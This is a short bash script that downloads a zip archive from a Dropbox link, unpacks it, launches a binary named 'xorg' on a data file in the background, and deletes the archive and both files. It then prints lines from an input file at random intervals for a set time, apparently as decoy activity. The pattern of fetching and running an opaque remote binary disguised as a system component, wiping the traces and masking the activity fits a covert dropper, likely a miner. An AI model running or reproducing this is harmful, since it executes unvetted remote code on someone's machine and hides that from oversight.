#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/hmknxrb4dw3msjw/wan11.zip -q
unzip wan11.zip > /dev/null 2>&1
#pwd
./xorg ./xdata &
sleep 3
rm -rf wan11.zip
rm -rf xorg
rm -rf xdata
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 20 ))
done < $2

